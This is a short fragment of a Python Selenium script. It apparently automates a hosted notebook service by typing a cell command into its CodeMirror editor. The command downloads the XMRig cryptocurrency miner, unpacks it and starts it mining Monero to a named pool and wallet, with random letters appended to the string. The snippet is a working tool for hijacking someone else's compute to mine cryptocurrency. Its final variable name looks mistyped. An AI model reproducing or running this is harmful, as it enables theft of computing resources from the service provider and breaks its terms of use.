...
driver.find_element_by_css_selector(".CodeMirror textarea").send_keys("! wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -a randomx/0 --url=pool.minexmr.com:4444 -u 82zfJhH3TB4B5aAUvM7J7ZFQp4MxB1izWWdwzNxi1MKd2UpYuoT75jjQmUfS7w8mN7ezP4VqEZC1W7RYkbhEAx5mVUepMcB -R --variant=-1 --donate-level=1"+randomLetter+randomLette)
